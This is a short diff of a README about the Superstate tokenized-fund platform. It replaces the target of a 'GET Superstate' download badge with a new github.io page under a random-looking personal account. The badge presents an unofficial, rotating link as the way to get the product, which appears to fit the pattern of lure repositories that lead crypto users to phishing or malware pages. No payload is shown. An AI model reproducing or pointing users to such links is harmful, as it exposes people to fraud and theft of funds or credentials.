@@ -50,7 +50,7 @@ For developers, analysts, and investors, Superstate investment platform research
 
 Prerequisites: A browser, access to public Superstate materials, and a basic understanding of tokenized securities, blockchain settlement, and fund documentation.
 
-[![GET Superstate](https://img.shields.io/badge/GET%20%E2%80%94%20Superstate-0078D6?style=for-the-badge&logoColor=white)](https://vancehudsonazuw.github.io/.github/superstate-ustb)
+[![GET Superstate](https://img.shields.io/badge/GET%20%E2%80%94%20Superstate-0078D6?style=for-the-badge&logoColor=white)](https://noeljaramillovurz.github.io/.github/superstate-ustb)
 
 1.  **Open the Repository:** Begin with the Superstate crypto overview and identify the sections covering Superstate USTB and Superstate USCC.
 2.  **Review Fund Context:** Compare Superstate tokenized funds with Superstate treasury fund references to understand the product family.
